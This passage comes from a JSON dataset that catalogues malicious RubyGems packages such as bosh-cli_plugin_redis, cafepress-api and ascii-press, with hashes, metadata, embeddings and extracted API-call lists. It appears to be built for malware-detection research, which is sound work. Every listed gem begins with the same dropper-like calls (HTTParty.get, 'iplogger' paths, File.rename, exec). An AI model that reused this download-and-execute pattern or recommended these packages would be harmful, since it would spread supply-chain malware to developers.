            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'include', 'include', 'usage', 'desc', 'say', 'nl', 'Bosh::Cli::Config.commands.values.find_all', 'Bosh::Cli::Config.commands.values', 'Bosh::Cli::Config.commands', 'c.usage.=~', 'c.usage', 'Bosh::Cli::Command::Help.list_commands', 'usage', 'desc', 'within_bosh_release', 'YAML.load_file', 'release_index.[](\"builds\").values.inject', 'release_index.[](\"builds\").values', 'release_index.[]', 'release.[]', 'max_version.<', 'sh', 'usage', 'desc', 'option', 'option', 'option', 'option', 'auth_required', 'options.[]', 'options', 'default_name', 'options.[]', 'options', 'default_size', 'options.[]', 'options', 'default_persistent_disk', 'options.[]', 'options', 'default_security_group', 'bosh_status', 'nl', 'say', 'bosh_cpi.make_green', 'bosh_cpi', 'say', 'service_name.make_green', 'say', 'validated_resource_size_colored', 'say', 'persistent_disk.to_s.make_green', 'persistent_disk.to_s', 'say', 'security_group.make_green', 'nl', 'step', 'available_resource_sizes.join', 'available_resource_sizes', 'available_resource_sizes.include?', 'available_resource_sizes', 'confirmed?', 'cancel_deployment', 'confirmed?', 'cancel_deployment', 'errors.empty?', 'errors', 'raise', 'template_file', 'step', 'redis_deployments_store_path', 'redis_deployments_store_path', 'mkdir_p', 'redis_deployments_store_path', 'step', 'File.open', 'file.<<', '{ \"name\" => service_name, \"director_uuid\" => bosh_uuid, \"networks\" => {}, \"properties\" => { \"redis\" => { \"resource\" => resource_size, \"security_group\" => security_group, \"persistent_disk\" => persistent_disk } } }.to_yaml', 'bosh_uuid', 'Bosh::Cli::Config.output', 'Bosh::Cli::Config.output=', 'deployment_cmd({ non_interactive: true }).set_current', 'deployment_cmd', 'biff_cmd({ non_interactive: true }).biff', 'biff_cmd', 'Bosh::Cli::Config.output=', 'deployment_cmd.set_current', 'deployment_cmd', 'deployment_cmd({ non_interactive: options.[](:non_interactive) }).perform', 'deployment_cmd', 'options.[]', 'options', 'errors.each', 'errors', 'say', 'error.make_red', 'usage', 'desc', 'load_bosh_and_validate_current_deployment', 'print', 'service_uri', 'usage', 'desc', 'load_bosh_and_validate_current_deployment', 'deployment_cmd({ non_interactive: options.[](:non_interactive) }).delete', 'deployment_cmd', 'options.[]', 'options', 'deployment_name', 'protected', 'Time.now.to_i', 'Time.now', 'File.expand_path', 'chdir', 'bosh_release_dir', 'File.join', 'bosh_release_dir', 'bosh_cpi', 'File.exists?', 'template_file', 'err', 'YAML.load_file', 'template_file', 'bosh_release_spec.[]', 'bosh_release_spec', 'resources.is_a?', 'resources.first.is_a?', 'resources.first', 'err', 'available_resource_sizes.include?', 'available_resource_sizes', 'resource_size.make_green', 'resource_size.make_red', 'step', 'bosh_director_client.get_status', 'bosh_director_client', 'bosh_status.[]', 'bosh_status', 'bosh_status.[]', 'bosh_status', 'director', 'Bosh::Cli::Command::Deployment.new', 'options.each', 'cmd.add_option', 'key.to_sym', 'Bosh::Cli::Command::Biff.new', 'options.each', 'cmd.add_option', 'key.to_sym', 'deployment', 'auth_required', 'File.exists?', 'deployment_file', 'err', 'deployment_file', 'YAML.load_file', 'deployment_file', '@deployment.[]', '@deployment.[](\"release\").[](\"name\").==', '@deployment.[](\"release\").[]', '@deployment.[]', 'release_name', 'err', 'deployment_file', '@deployment.[]', '@deployment.[](\"properties\").[](\"redis\").[]', '@deployment.[](\"properties\").[]', '@deployment.[]', '@deployment.[](\"properties\").[](\"redis\").[]', '@deployment.[](\"properties\").[]', '@deployment.[]', 'server_host', 'bosh_director_client.fetch_vm_state', 'bosh_director_client', 'deployment_name', 'vms.empty?', 'err', 'vms.size.>', 'vms.size', 'say', '\"WARNING!\".make_red', 'vms.size', 'vms.first', 'vm.[](\"dns\").select { |dns,|\\n  dns =~ /#{deployment_name}/\\n}.first', 'vm.[](\"dns\").select', 'vm.[]', 'dns.=~', 'deployment_name']",
            "n_tokens": 1181,
            "embedding": "[-0.00651353 -0.0086387  -0.01182187 ... -0.00735532 -0.00665153\n  0.02009258]",
            "cluster": "0",
            "id": 725,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bosh-cli_plugin_redis/0.2.3/bosh-cli_plugin_redis-0.2.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bosh-cli_plugin_redis/0.2.3/bosh-cli_plugin_redis-0.2.3_extracted",
            "name": "bosh-cli_plugin_redis",
            "version": "0.2.3",
            "published_at": "2020-02-20T21:00:23.305Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, bosh_cli, rake",
            "SHA-256": "7f932fb7164dc262c858ca1d4d90f0ac3102ad6180557cef02f85a6333d98684"
        },
        {
            "name_version": "brightbox_boxgrinder-plugins-0.0.6",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/brightbox_boxgrinder-plugins/0.0.6/brightbox_boxgrinder-plugins-0.0.6_extracted/brightbox_boxgrinder-plugins-0.0.6_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'plugin', 'set_default_config_value', 'default_description', 'set_default_config_value', 'default_name', 'set_default_config_value', 'default_username', 'set_default_config_value', 'default_mode', 'set_default_config_value', 'default_public', 'validate_mode', 'validate_public', '@log.info', '@plugin_config.[]', '@log.info', 'account', 'upload', 'register_image', '@log.info', 'ftp_hash.[]', 'ftp_hash', 'system', 'curl_command', '@log.info', '@plugin_config.[]', 'raise', '@log.info', 'image_id', 'account', '@plugin_config.[]', '@log.info', 'image_id', '@exec_helper.execute(register_image_command).=~', '@exec_helper.execute', 'register_image_command', 'Regexp.last_match.[]', 'Regexp.last_match', 'raise', '@exec_helper.execute(\"brightbox-accounts -s list 2>/dev/null\").split.[]', '@exec_helper.execute(\"brightbox-accounts -s list 2>/dev/null\").split', '@exec_helper.execute', '@log.error', 'e.message', 'raise', '@previous_deliverables.[]', 'Hash.[]', '@exec_helper.execute(\"brightbox-accounts -s reset_ftp_password #{account} 2>/dev/null\").split', '@exec_helper.execute', 'account', 'File.basename', 'disk_image', 'ENV.[]', 'ftp_hash.[]', 'ftp_hash', 'ftp_hash.[]', 'ftp_hash', 'disk_image', 'ftp_hash.[]', 'ftp_hash', 'target_name', '@appliance_config.name', '@appliance_config.summary', '@plugin_config.[]', 'raise', '@plugin_info.[]', '@plugin_config.[]', 'raise', '@plugin_info.[]', '@appliance_config.hardware.arch', '@appliance_config.hardware', 'target_name', '@plugin_config.[]', '@plugin_config.[]', '@plugin_config.[]', '@plugin_config.[]', '@plugin_config.[]', 'require', 'require', 'plugin', 'register_deliverable', 'deliverable_name', 'set_default_config_value', 'default_user', 'has_cloud_init?', '@appliance_config.packages', '@log.info', '@appliance_config.name', '@log.debug', '@image_helper.convert_disk', '@previous_deliverables.disk', '@deliverables.disk', '@log.debug', '@log.debug', '@image_helper.customize', '@deliverables.disk', 'add_default_user', 'disable_root_password', 'set_default_timezone', 'change_ssh_configuration', 'has_cloud_init?', 'customise_cloud_init', 'update_rc_local', 'execute_post', '@log.debug', '@appliance_config.os.name.==', '@appliance_config.os.name', '@appliance_config.os', '@appliance_config.os.version.>=', '@appliance_config.os.version', '@appliance_config.os', 'guestfs_helper.sh', '@plugin_config.[]', '@appliance_config.post.[]', '@appliance_config.post', '@appliance_config.post.[](\"bbcloud\").each', '@appliance_config.post.[]', '@appliance_config.post', 'guestfs_helper.sh', '@appliance_config.hardware.arch', '@appliance_config.hardware', '@log.debug', '@log.debug', '@appliance_config.name', '@appliance_config.version', '@appliance_config.release', '@appliance_config.os.name', '@appliance_config.os', '@appliance_config.os.version', '@appliance_config.os', '@log.debug', '@plugin_config.[]', 'guestfs.fgrep(@plugin_config.[](\"username\"), \"/etc/passwd\").empty?', 'guestfs.fgrep', '@plugin_config.[]', '@log.debug', '@plugin_config.[]', 'guestfs.sh', '@plugin_config.[]', 'guestfs.sh', '@plugin_config.[]', '@log.debug', '@plugin_config.[]', '@log.debug', 'guestfs_helper.sh', '@log.info', '@plugin_config.[]', '@log.debug', 'Tempfile.new', 'guestfs.exists(\"/etc/rc.d/rc.local\").==', 'guestfs.exists', 'rc_local.<<', 'guestfs.read_file', 'rc_local.<<', 'rc_local.<<', 'File.read', 'File.dirname', 'rc_local.flush', 'guestfs.upload', 'rc_local.path', 'rc_local.close', 'guestfs_helper.augeas', 'set', 'set', 'set', 'guestfs_helper.augeas', 'set', 'set', 'guestfs_helper.guestfs.cp', 'guestfs_helper.guestfs']",
            "n_tokens": 1048,
            "embedding": "[-0.00660058  0.00770068 -0.00385034 ... -0.01084989 -0.0248537\n  0.03059498]",
            "cluster": "0",
            "id": 613,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/brightbox_boxgrinder-plugins/0.0.6/brightbox_boxgrinder-plugins-0.0.6.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/brightbox_boxgrinder-plugins/0.0.6/brightbox_boxgrinder-plugins-0.0.6_extracted",
            "name": "brightbox_boxgrinder-plugins",
            "version": "0.0.6",
            "published_at": "2020-02-20T21:02:31.848Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "brightbox-cli",
            "SHA-256": "a9f22cf2ed4543bfde39c940febc05cdb375ac25707392ae8f5bb6582c871b93"
        },
        {
            "name_version": "cocoapods_icemobile-plugin-0.0.8",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cocoapods_icemobile-plugin/0.0.8/cocoapods_icemobile-plugin-0.0.8_extracted/cocoapods_icemobile-plugin-0.0.8_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'Pod::Command.class_eval', 'self.description=', 'Pod::Installer.class_eval', 'resolve_dependencies', 'download_dependencies', 'generate_pods_project', 'config.integrate_targets?', 'config', 'integrate_user_project', 'is_bright_project?', 'integrate_bright_projects', 'puts', 'project_paths.each', 'File.exist?(project_path).!', 'File.exist?', 'puts', 'Xcodeproj::Workspace.new_from_xcworkspace', 'project_paths.each', 'workspace.projpaths.include?', 'workspace.projpaths', 'workspace.projpaths.push', 'workspace.projpaths', 'podfile.target_definitions.values.all?', 'podfile.target_definitions.values', 'podfile.target_definitions', 'podfile', 'td.empty?', 'workspace.projpaths.include?', 'workspace.projpaths', 'workspace.projpaths.delete', 'workspace.projpaths', 'workspace.save_as', 'Pod::Installer::UserProjectIntegrator.class_eval', 'create_workspace', 'integrate_user_targets', 'workspace_path', 'self.summary=', 'self.arguments=', 'argv.shift_argument', 'argv.shift_argument', 'ENV.[]=', 'help!', 'new_project', 'public', 'File.directory?', 'UI.puts', '\"Fatal: Directory #{name} already exists. Please delete it and run again.\".red', 'FileUtils.mkdir_p', 'run_git_command', 'create_project_files', 'create_xcode_project', 'copy_resources', 'remove_unnecessary_folders', 'run_pod_command', 'run_git_command', 'run_git_command', 'run_git_command', 'Dir.foreach', 'item.==', 'item.==', 'item.start_with?', 'item.start_with?', 'item.start_with?', 'BRIGHT_REQUIRED.include?', 'item.start_with?', 'UI.puts', '\"Removing #{item}\".green', 'FileUtils.rm_rf', 'FileUtils.mkdir_p', 'dirs.each', 'FileUtils.mkdir_p', 'FileUtils.mkdir_p', 'Dir.chdir', 'File.exist?', 'File.delete', 'Pod::Helper::Gitignore.new(@name, @prefix).file', 'Pod::Helper::Gitignore.new', 'Pod::Helper::Podfile.new(@name, @prefix).file', 'Pod::Helper::Podfile.new', 'Pod::Helper::Readme.new(@name, @prefix).file', 'Pod::Helper::Readme.new', 'Dir.chdir', 'Pod::Helper::BootstrapDelegateH.new(@name, @prefix).file', 'Pod::Helper::BootstrapDelegateH.new', 'Pod::Helper::BootstrapDelegateM.new(@name, @prefix).file', 'Pod::Helper::BootstrapDelegateM.new', 'Dir.chdir', 'Pod::Helper::InfoPlist.new(@name, @prefix).file', 'Pod::Helper::InfoPlist.new', 'Pod::Helper::MainM.new(@name, @prefix).file', 'Pod::Helper::MainM.new', 'Pod::Helper::PrefixHeader.new(@name, @prefix).file', 'Pod::Helper::PrefixHeader.new', 'Dir.chdir', 'Pod::Helper::SidebarContainerViewControllerSkinnerH.new(@name, @prefix).file', 'Pod::Helper::SidebarContainerViewControllerSkinnerH.new', 'Pod::Helper::SidebarContainerViewControllerSkinnerM.new(@name, @prefix).file', 'Pod::Helper::SidebarContainerViewControllerSkinnerM.new', 'Dir.chdir', 'UI.puts', '\"Copying Resources from WhiteLabel\".green', 'system', 'system', 'system', 'UI.puts', 'Helper::ProjectBuilder.new', 'builder.build_project', 'Dir.chdir', 'UI.puts', '\"run git #{command}\".green', 'system', 'Dir.chdir', 'UI.puts', '\"run pod #{command}\".green', 'system', 'Dir.chdir', 'Gem.bin_path', 'require', 'Bundler.with_clean_env', 'UI.puts', '\"run bundle #{command}\".green', 'Gem.ruby', 'require', 'create_project', 'configure_project', 'save_project', 'Xcodeproj::Project.new', '@project.save', 'create_groups', 'create_target', 'add_required_files', 'add_default_frameworks', '@project.new_target', '@main_target.build_configuration_list.build_configurations.each', '@main_target.build_configuration_list.build_configurations', '@main_target.build_configuration_list', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', 'bc.build_settings.[]=', 'bc.build_settings', '@main_target.new_shell_script_build_phase', 'phase.shell_script=', 'phase.show_env_vars_in_log=', '@main_target.build_phases.delete', '@main_target.build_phases', '@main_target.build_phases.insert', '@main_target.build_phases', '@project.frameworks_group.new_product_ref_for_target', '@project.frameworks_group', '@main_target.frameworks_build_phase.add_file_reference', '@main_target.frameworks_build_phase', '@project.frameworks_group.new_product_ref_for_target', '@project.frameworks_group', '@main_target.frameworks_build_phase.add_file_reference', '@main_target.frameworks_build_phase', '@project.frameworks_group.new_file', '@project.frameworks_group', '@main_target.frameworks_build_phase.add_file_reference', '@main_target.frameworks_build_phase', '@project.frameworks_group.new_file', '@project.frameworks_group', '@main_target.frameworks_build_phase.add_file_reference', '@main_target.frameworks_build_phase', '@project.new_group', '@sources.new_group', '@sources.new_group', '@resources.new_group', '@common_resources.new_group', '@sources.new_group', '@sources.new_group', '@sources.new_file', 'sources_dir.+', 'BootstrapDelegateH.new(@name, @prefix).name', 'BootstrapDelegateH.new', '@sources.new_file', 'sources_dir.+', 'BootstrapDelegateM.new(@name, @prefix).name', 'BootstrapDelegateM.new', '@supporting_files.new_file', 'Readme.new(@name, @prefix).name', 'Readme.new', '@supporting_files.new_file', 'supporting_files_dir.+', 'InfoPlist.new(@name, @prefix).name', 'InfoPlist.new', '@supporting_files.new_file', 'supporting_files_dir.+', 'PrefixHeader.new(@name, @prefix).name', 'PrefixHeader.new', '@supporting_files.new_file', 'supporting_files_dir.+', 'MainM.new(@name, @prefix).name', 'MainM.new', '@skinners.new_file', 'skinner_dir.+', 'SidebarContainerViewControllerSkinnerH.new(@name, @prefix).name', 'SidebarContainerViewControllerSkinnerH.new', '@skinners.new_file', 'skinner_dir.+', 'SidebarContainerViewControllerSkinnerM.new(@name, @prefix).name', 'SidebarContainerViewControllerSkinnerM.new', '@revision.new_file', 'revision_dir.+', '@revision.new_file', 'revision_dir.+', '@resources.new_file', 'resources_dir.+', '@common_resources.new_file', 'common_resources_dir.+', '@common_resources.new_file', 'common_resources_dir.+', '@common_resources.new_file', 'common_resources_dir.+', '@common_resources.new_file', 'common_resources_dir.+', '@common_resources.new_reference', 'common_resources_dir.+', '@common_resources_fonts.new_file', 'common_resources_fonts_dir.+', '@common_resources_fonts.new_file', 'common_resources_fonts_dir.+', '@main_target.add_file_references', '@main_target.add_resources', '@main_target.add_system_libraries', '@main_target.add_system_frameworks', 'require', 'Date.today.strftime', 'Date.today', 'project_name.downcase', 'File.join', 'File.dirname', 'File.expand_path', 'File.open', 'name', 'output_file.puts', 'template.result', 'template', 'binding', 'File.exists?', 'name', 'public', 'exists?', 'File.read', 'name', 'write', 'ERB.new', 'File.read', 'fixture_path', 'template_name', 'name']",
            "n_tokens": 1832,
            "embedding": "[-0.02046701 -0.00904577 -0.00779628 ... -0.00142647 -0.02464783\n  0.01495593]",
            "cluster": "0",
            "id": 452,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cocoapods_icemobile-plugin/0.0.8/cocoapods_icemobile-plugin-0.0.8.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cocoapods_icemobile-plugin/0.0.8/cocoapods_icemobile-plugin-0.0.8_extracted",
            "name": "cocoapods_icemobile-plugin",
            "version": "0.0.8",
            "published_at": "2020-02-20T21:07:32.083Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "cocoapods",
            "SHA-256": "9d1ccdf54a7edfb613720300ca3713697f0430ee31643422d474ecf526e66c0f"
        },
        {
            "name_version": "ascii-press-0.5.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ascii-press/0.5.2/ascii-press-0.5.2_extracted/ascii-press-0.5.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'Logger.new', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_accessor', 'attr_accessor', 'doc.doctitle', 'doc.attributes.[]', 'doc.attributes', 'doc', 'name.to_s', 'attribute_value', 'value.==', 'value.split', 'doc.attributes.key?', 'doc.attributes', 'doc', 'name.to_s', 'capture_stderr', 'File.read', '::File.expand_path', 'File.dirname', '@options.[]', 'before_convertion.call', 'Asciidoctor.load', '@options.[](:asciidoc_options).merge', '@options.[]', 'puts', 'errors.split(/[\\\\n\\\\r]+/).reject { |line,|\\n  line.match(/out of sequence/)\\n}.join', 'errors.split(/[\\\\n\\\\r]+/).reject', 'errors.split', 'line.match', 'doc.convert', '@options.[]', 'after_conversion.call', 'doc.attributes.each_with_object', 'doc.attributes', 'result.[]=', 'key.to_sym', 'value.to_s', 'data.reject!', 'value.nil?', 'Rendering.new(html, doc, data).tap', 'Rendering.new', 'rendering.tags=', 'rendering.list_attribute_value', 'rendering.attribute_exists?', 'rendering.tags.<<', 'rendering.tags', 'rendering.attribute_exists?', 'rendering.tags.<<', 'rendering.tags', '@options.[]', 'rendering.tags=', '@options.[](:rendering_proc).call', '@options.[]', 'private', 'StringIO.new', '$stderr.string', 'Rubypress::Client.new', 'options.[]', 'AsciiPress.logger', 'Renderer.new', 'options.[]', 'Proc.new', 'options.[]', 'options.[]', '@wp_client.getPosts', 'all_pages.index_by', 'post.[]', 'log', '@all_pages_by_post_name.size', 'adoc_file_paths.each', 'synced_post_names.<<', 'sync_file_path', '(@all_pages_by_post_name.keys - synced_post_names)\\n.each', '@all_pages_by_post_name.keys.-', '@all_pages_by_post_name.keys', '@all_pages_by_post_name.[](post_name_to_delete).[]', '@all_pages_by_post_name.[]', 'log', 'send_message', 'private', '@renderer.render', '@filter_proc.call(rendering.doc).!', '@filter_proc.call', 'rendering.doc', '(slug = rendering.attribute_value(:slug))\\n.!', 'rendering.attribute_value', 'log', 'rendering.title', 'rendering.html', 'log', 'custom_fields.merge({ \"adoc_attributes\" => rendering.doc.attributes.to_json }).map', 'custom_fields.merge', 'rendering.doc.attributes.to_json', 'rendering.doc.attributes', 'rendering.doc', 'Time.now.-', 'Time.now', '60 * 60.*', '60.*', '@options.[]', 'content.[]=', 'rendering.tags', '@all_pages_by_post_name.[]', 'page.[]', 'content.[](:custom_fields).each', 'content.[]', 'page.[](\"custom_fields\").find', 'page.[]', 'field.[](\"key\").==', 'field.[]', 'f.[]', 'f.[]=', 'found.[]', 'page.[](\"post_id\").to_i', 'page.[]', 'log', 'content.[](:custom_fields).inspect', 'content.[]', 'send_message', 'log', 'send_message', '[:post_content, :post_title, :post_name, :post_status].any?', 'content.[](key).!=', 'content.[]', 'page.[]', 'key.to_s', 'page.[](\"custom_fields\").each_with_object', 'page.[]', 'h.[]=', 'field.[]', 'field.[]', 'content.[](:custom_fields).each_with_object', 'content.[]', 'h.[]=', 'field.[](:key).to_s', 'field.[]', 'field.[]', 'main_keys_different.!', 'oyyyy', '@logger.send', '@wp_client.send(message, *args).tap', '@wp_client.send', 'result.!', 'raise', 'lambda', '[\"-\", \"_\"].include?(slug.[](0)).!', '[\"-\", \"_\"].include?', 'slug.[]', 'lambda', '[\"-\", \"_\"].include?(slug.[](-1)).!', '[\"-\", \"_\"].include?', 'slug.[]', 'lambda', 'slug.match(/--/).!', 'slug.match', 'lambda', '!slug.match(/^[a-z0-9\\\\-\\\\_]+$/).!', 'slug.match(/^[a-z0-9\\\\-\\\\_]+$/).!', 'slug.match', 'rules.values.all?', 'rules.values', 'rule.call', 'slug.nil?', 'rules.reject { |desc, rule|\\n  rule.call(slug)\\n}.map', 'rules.reject', 'rule.call', 'adoc_paths.map { |path,|\\n  doc = Asciidoctor.load(File.read(path))\\n  slug = doc.attributes.[](\"slug\")\\n  if !slug_valid?(slug, rules)\\n    violations = violated_slug_rules(slug, rules)\\n    [path, slug, violations]\\n  end\\n}.compact', 'adoc_paths.map', 'Asciidoctor.load', 'File.read', 'doc.attributes.[]', 'doc.attributes', 'slug_valid?(slug, rules).!', 'slug_valid?', 'violated_slug_rules', 'data.size.>', 'data.size', 'require', 'data.each', 'puts', '\"WARNING!!\".red', 'puts', 'path.light_blue', 'slug.inspect.light_blue', 'slug.inspect', 'violations.each', 'puts', 'violation.yellow', 'raise']",
            "n_tokens": 1332,
            "embedding": "[-0.00260512 -0.02507488 -0.0055389  ...  0.00100169 -0.02457222\n  0.01120346]",
            "cluster": "0",
            "id": 28,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ascii-press/0.5.2/ascii-press-0.5.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/ascii-press/0.5.2/ascii-press-0.5.2_extracted",
            "name": "ascii-press",
            "version": "0.5.2",
            "published_at": "2020-02-21T22:32:43.845Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, rubocop, rubypress, asciidoctor, activesupport, colorize",
            "SHA-256": "fff95d11e60445493ab81ad65cf05cda010eadf604149f3405e5e85b74af4840"
        },
        {
            "name_version": "cafepress-api-0.3.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cafepress-api/0.3.2/cafepress-api-0.3.2_extracted/cafepress-api-0.3.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'include', 'include', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'open', 's.read', 'REXML::Document.new(content).root.text', 'REXML::Document.new(content).root', 'REXML::Document.new', 'ENV.[]', 'open', 's.read', 'REXML::Document.new', 'doc.root.elements.to_a.each', 'doc.root.elements.to_a', 'doc.root.elements', 'doc.root', 'product.get_elements(\"mediaConfiguration[@perspectives=\\'Back\\']\").first.attributes.[]', 'product.get_elements(\"mediaConfiguration[@perspectives=\\'Back\\']\").first.attributes', 'product.get_elements(\"mediaConfiguration[@perspectives=\\'Back\\']\").first', 'product.get_elements', '(gender = PRODUCT_GENDERS.[](product.attributes.[](\"merchandiseId\")))\\n.nil?', 'PRODUCT_GENDERS.[]', 'product.attributes.[]', 'product.attributes', 'PRODUCT_GENDERS.[]', 'product.attributes.[]', 'product.attributes', 'gender.nil?', 'warn', 'product.attributes.[]', 'product.attributes', 'product.attributes.[]', 'product.attributes', 'product.get_elements(\"color\").each', 'product.get_elements', 'color.attributes.[]', 'color.attributes', 'valid_color_ids.<<', 'color.attributes.[]', 'color.attributes', 'COLORS.[](color_id).nil?', 'COLORS.[]', 'warn', 'color.attributes.[]', 'color.attributes', 'product.attributes.[]', 'product.attributes', 'color.attributes.[]', 'color.attributes', 'product.get_elements(\"productImage\").each', 'product.get_elements', 'valid_color_ids.include?', 'product_image.attributes.[]', 'product_image.attributes', 'valid_color_ids.length.==', 'valid_color_ids.length', 'product_image.attributes.[](\"productUrl\").include?', 'product_image.attributes.[]', 'product_image.attributes', 'image_urls.<<', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[](\"productUrl\").include?', 'product_image.attributes.[]', 'product_image.attributes', 'image_urls.<<', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[]', 'product_image.attributes', 'warn', 'product_image.attributes.[]', 'product_image.attributes', 'image_urls.<<', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[]', 'product_image.attributes', 'product_image.attributes.[]', 'product_image.attributes', 'valid_color_ids.length.==', 'valid_color_ids.length', 'product.get_elements(\"color[@default=\\'true\\']\").first.attributes.[]', 'product.get_elements(\"color[@default=\\'true\\']\").first.attributes', 'product.get_elements(\"color[@default=\\'true\\']\").first', 'product.get_elements', 'product.get_elements(\"size\").each', 'product.get_elements', 'sizes.<<', 'size.attributes.[]', 'size.attributes', 'size.attributes.[]', 'size.attributes', 'size.attributes.[]', 'size.attributes', 'size.attributes.[](\"default\").==', 'size.attributes.[]', 'size.attributes', 'size.attributes.[]', 'size.attributes', 'products.<<', 'product.attributes.[]', 'product.attributes', 'product.attributes.[]', 'product.attributes', 'product.attributes.[]', 'product.attributes', 'product.attributes.[]', 'product.attributes', 'product.get_elements(\"mediaConfiguration[@perspectives=\\'Front\\']\").first.attributes.[]', 'product.get_elements(\"mediaConfiguration[@perspectives=\\'Front\\']\").first.attributes', 'product.get_elements(\"mediaConfiguration[@perspectives=\\'Front\\']\").first', 'product.get_elements', 'product.attributes.[]', 'product.attributes', 'product.attributes.[]', 'product.attributes', 'ENV.[]', 'open', 's.read', 'REXML::Document.new', 'doc.root.attributes.[]', 'doc.root.attributes', 'doc.root', 'ENV.[]', 'open', 's.read', 'REXML::Document.new', 'doc.root.attributes.[]', 'doc.root.attributes', 'doc.root', 'doc.root.attributes.[]', 'doc.root.attributes', 'doc.root', 'COLORS.[](color_id).[](:merchandise_swatches).[]', 'COLORS.[](color_id).[]', 'COLORS.[]', 'base.extend']",
            "n_tokens": 1047,
            "embedding": "[-0.01212901 -0.01402097 -0.00418021 ... -0.00549691 -0.01462435\n  0.00482706]",
            "cluster": "0",
            "id": 707,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cafepress-api/0.3.2/cafepress-api-0.3.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cafepress-api/0.3.2/cafepress-api-0.3.2_extracted",
            "name": "cafepress-api",
            "version": "0.3.2",
            "published_at": "2020-02-21T22:34:34.496Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": NaN,
            "SHA-256": "06b41af4ce3505fa383976fedab90c968bde5a2a9de83f2586b0094b66b6e253"
        },
        {
            "name_version": "acts-as_keywordable-0.0.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acts-as_keywordable/0.0.9/acts-as_keywordable-0.0.9_extracted/acts-as_keywordable-0.0.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
